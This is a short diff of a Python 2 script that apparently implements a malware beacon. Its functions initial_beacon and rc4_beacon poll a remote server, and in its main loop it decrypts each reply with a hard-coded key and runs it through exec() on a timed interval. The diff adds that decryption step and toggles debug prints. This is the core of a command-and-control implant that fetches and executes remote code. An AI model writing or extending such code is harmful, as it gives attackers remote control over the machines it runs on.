@@ -55,6 +55,7 @@ def initial_beacon():
         request.add_header("User-Agent", user_agent)
         f = urllib2.urlopen(request)
         response = f.read()
+        print response
         return response
     except:
         pass
@@ -77,7 +78,7 @@ def rc4_beacon(key):
         request.add_header("Content-Type", "application/json")
         f = urllib2.urlopen(request)
         response = f.read()
-        print response
+        #print response
         return response
     except:
         pass
@@ -90,7 +91,7 @@ if __name__ == "__main__":
         if counter == 0:
             k = base64.b64decode(initial_beacon())
         else:
-            exec(rc4_beacon(k))
+            exec(crypt("123456", rc4_beacon(k)))
 
         counter += 1
         time.sleep(sleep_interval)
